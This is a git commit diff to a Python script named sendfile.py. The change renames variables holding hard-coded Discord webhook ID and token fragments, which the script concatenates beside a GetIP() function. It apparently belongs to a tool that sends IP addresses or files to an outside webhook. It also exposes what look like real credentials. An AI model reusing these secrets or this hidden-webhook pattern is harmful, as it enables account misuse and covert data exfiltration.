85706b86ce9af032a3856336cb2b75e6113e208c
Yousef.D <joseph.dolatabadi@gmail.com>
2022-01-15 04:20:33 +0330

    Update sendfile.py

--- sendfile.py
+++ sendfile.py
@@ -12,8 +12,8 @@ def GetIP():
 
 key1 = '931710180'
 key2 = '104740885'
-key1 = 'cVX9D5mhe62PGxUtocAQmk6jju5M'
-key2 = 'f0Yy5UyHYlYrWGpVE3d2UW-M-wv4gODup8EnRgkc'
+key3 = 'cVX9D5mhe62PGxUtocAQmk6jju5M'
+key4 = 'f0Yy5UyHYlYrWGpVE3d2UW-M-wv4gODup8EnRgkc'
 
 webhook = discord.Webhook.partial(key1 + key2, key3 + key4, adapter=discord.RequestsWebhookAdapter())
 
